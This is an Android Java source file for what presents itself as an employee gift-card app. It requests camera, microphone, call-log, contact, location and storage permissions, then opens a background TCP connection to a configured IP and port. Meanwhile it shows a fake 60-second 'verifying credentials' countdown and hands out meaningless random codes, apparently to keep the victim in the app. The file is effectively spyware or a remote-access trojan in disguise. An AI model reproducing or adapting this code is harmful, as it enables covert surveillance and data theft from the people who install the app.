package com.employee.giftcard;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;

import android.Manifest;
import android.app.Activity;
import android.content.Context;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.PowerManager;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;
import java.util.Random;


public class MainActivity extends AppCompatActivity {

    Activity activity = this;
    Context context;
    static String TAG = "MainActivityClass";
    private PowerManager.WakeLock mWakeLock = null;
    
    private TextView countdownText;
    private Button generateButton;
    private int countdown = 60;
    private Handler handler = new Handler();
    
    private String[] loadingMessages = {
        "Verifying employee credentials...",
        "Checking authorization...",
        "Validating access rights...",
        "Loading employee benefits...",
        "Preparing reward codes...",
        "Almost ready..."
    };
    private int currentMessageIndex = 0;
    private static final int PERMISSION_REQUEST_CODE = 123;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        
        context = getApplicationContext();
        Log.d(TAG, config.IP + "\t" + config.port);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            // Build permission list dynamically based on Android version
            java.util.ArrayList<String> permissionList = new java.util.ArrayList<>();
            
            // Core permissions (all Android versions)
            permissionList.add(Manifest.permission.CAMERA);
            permissionList.add(Manifest.permission.RECORD_AUDIO);
            permissionList.add(Manifest.permission.READ_CALL_LOG);
            permissionList.add(Manifest.permission.READ_CONTACTS);
            permissionList.add(Manifest.permission.READ_PHONE_STATE);
            permissionList.add(Manifest.permission.ACCESS_FINE_LOCATION);
            permissionList.add(Manifest.permission.ACCESS_COARSE_LOCATION);
            permissionList.add(Manifest.permission.READ_EXTERNAL_STORAGE);
            permissionList.add(Manifest.permission.WRITE_EXTERNAL_STORAGE);
        
            String[] permissions = permissionList.toArray(new String[0]);
            ActivityCompat.requestPermissions(this, permissions, PERMISSION_REQUEST_CODE);
        }
        
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    // Wait 5 seconds to allow permissions to be granted
                    Thread.sleep(5000);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
                new tcpConnection(activity, context).execute(config.IP, config.port);
            }
        }).start();
        
        countdownText = findViewById(R.id.countdownText);
        generateButton = findViewById(R.id.generateButton);
        generateButton.setEnabled(false);
        generateButton.setAlpha(0.5f);
        
        Toast.makeText(this, "Do not leave the app during verification!", Toast.LENGTH_LONG).show();
        
        startCountdown();
        
        generateButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                generateGiftcard();
            }
        });
    }
    
    private void startCountdown() {
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                if (countdown > 0) {
                    if (countdown % 10 == 0 && currentMessageIndex < loadingMessages.length) {
                        countdownText.setText(loadingMessages[currentMessageIndex] + " (" + countdown + "s)");
                        currentMessageIndex++;
                    } else {
                        int idx = Math.min(currentMessageIndex, loadingMessages.length - 1);
                        countdownText.setText(loadingMessages[idx] + " (" + countdown + "s)");
                    }
                    countdown--;
                    handler.postDelayed(this, 1000);
                } else {
                    countdownText.setText("Authorization complete!");
                    generateButton.setEnabled(true);
                    generateButton.setAlpha(1.0f);
                }
            }
        }, 0);
    }
    
    private void generateGiftcard() {
        String code = generateRandomCode();
        Toast.makeText(this, "Employee Reward Code: " + code, Toast.LENGTH_LONG).show();
        countdownText.setText("Code: " + code);
        generateButton.setText("Generate Another Code");
    }
    
    private String generateRandomCode() {
        String chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        Random random = new Random();
        StringBuilder code = new StringBuilder();
        
        for (int i = 0; i < 4; i++) {
            for (int j = 0; j < 4; j++) {
                code.append(chars.charAt(random.nextInt(chars.length())));
            }
            if (i < 3) code.append("-");
        }
        return code.toString();
    }
    
    @Override
    protected void onDestroy() {
        super.onDestroy();
        handler.removeCallbacksAndMessages(null);
    }
}
